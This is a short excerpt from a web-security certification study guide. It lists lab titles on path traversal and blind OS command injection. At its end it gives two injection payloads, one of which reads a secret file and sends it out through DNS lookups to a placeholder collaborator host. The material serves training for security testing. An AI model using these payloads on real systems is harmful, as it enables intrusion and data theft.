Tip: We try path traversal techniques and command injection techniques against the available image's parameters.

### * Path Traversal

[](https://github.com/X0Rhyth/BSCP-Guide?tab=readme-ov-file#-path-traversal)

- File path traversal, simple case
    
- File path traversal, traversal sequences blocked with absolute path bypass
    
- File path traversal, traversal sequences stripped non-recursively
    
- File path traversal, traversal sequences stripped with superfluous URL-decode
    
- File path traversal, validation of start of path
    
- File path traversal, validation of file extension with null byte bypass
    

### * Command Injection

[](https://github.com/X0Rhyth/BSCP-Guide?tab=readme-ov-file#-command-injection-1)

- Blind OS command injection with time delays
    
- Blind OS command injection with output redirection
    
- Blind OS command injection with out-of-band interaction
    
- **_Blind OS command injection with out-of-band data exfiltration_**
    
    Tip: In this lab we used this command to interact with the collabrater
    
    ```
     x||nslookup+<collaborator>|| 
    ```
    
    We could use this payload to read a file.
    
    ```
    1||nslookup+$(cat+/home/carlos/secret).<collaborator>%26
    
    ```